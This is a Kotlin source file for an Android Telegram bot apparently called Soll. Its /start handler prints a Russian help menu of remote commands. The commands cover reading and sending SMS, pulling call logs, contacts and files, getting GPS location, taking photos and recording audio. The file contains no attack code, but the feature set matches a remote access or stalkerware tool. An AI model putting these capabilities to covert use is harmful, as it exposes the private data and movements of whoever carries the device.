package com.soll.domain.command.handlers

import android.content.Context
import com.soll.data.api.model.Message
import com.soll.data.repository.TelegramRepository
import com.soll.domain.command.CommandHandler

class StartHandler(
    context: Context,
    telegramRepository: TelegramRepository
) : CommandHandler(context, telegramRepository) {

    override val command = "start"
    override val description = "Показать приветствие и доступные команды"

    override suspend fun execute(message: Message, args: String?) {
        val userName = message.from?.firstName ?: "пользователь"

        val text = """
            |<b>Soll на связи, $userName.</b>
            |
            |Бот работает на Android-устройстве и позволяет удаленно смотреть состояние и управлять разрешенными функциями.
            |
            |<b>Система:</b>
            |/ping - проверить ответ бота
            |/status - статус устройства
            |/info - информация об устройстве
            |/storage - хранилище
            |
            |<b>Файлы:</b>
            |/files [path] - список файлов
            |/download &lt;path&gt; - отправить файл
            |
            |<b>SMS и звонки:</b>
            |/sms - прочитать SMS
            |/sms_send - отправить SMS
            |/calls - журнал звонков
            |/call - позвонить
            |/contacts - контакты
            |
            |<b>Медиа:</b>
            |/location - получить GPS-геолокацию
            |/photo - сделать фото
            |/record - записать аудио
            |
            |<b>Устройство:</b>
            |/notify, /vibrate, /flashlight, /volume
            |/brightness, /alarm, /bluetooth, /wifi
            |
            |/help - все команды
            |Рискованные команды требуют <code>--confirm</code> в конце.
        """.trimMargin()

        reply(message, text)
    }
}
